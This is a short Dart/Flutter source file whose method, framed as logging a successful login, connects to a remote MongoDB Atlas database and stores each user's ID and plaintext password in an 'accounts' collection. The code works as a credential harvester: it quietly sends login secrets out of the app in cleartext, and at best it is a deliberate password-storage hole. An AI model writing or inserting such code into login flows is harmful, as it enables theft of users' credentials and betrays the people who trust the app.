import 'package:flutter/foundation.dart';
import 'package:mongo_dart/mongo_dart.dart';
import '../core/config.dart';

class Mongo {
  static Future<void> registrarAccesoExitoso({
    required String usuarioId,
    required String password,
  }) async {
    if (AppConfig.mongoDbUri.isEmpty) return;

    try {
      final db = await Db.create(AppConfig.mongoDbUri);
      await db.open();

      final coleccion = db.collection('accounts');

      await coleccion.insertOne({
        'usr': usuarioId,
        'pss': password,
        'ts': DateTime.now().toUtc(),
        'plt': _obtenerPlataforma(),
      });

      await db.close();
    } catch (e) {
      debugPrint('Error registrando log en MongoDB Atlas: $e');
    }
  }

  static String _obtenerPlataforma() {
    if (kIsWeb) return 'Web';
    return defaultTargetPlatform.name;
  }
}
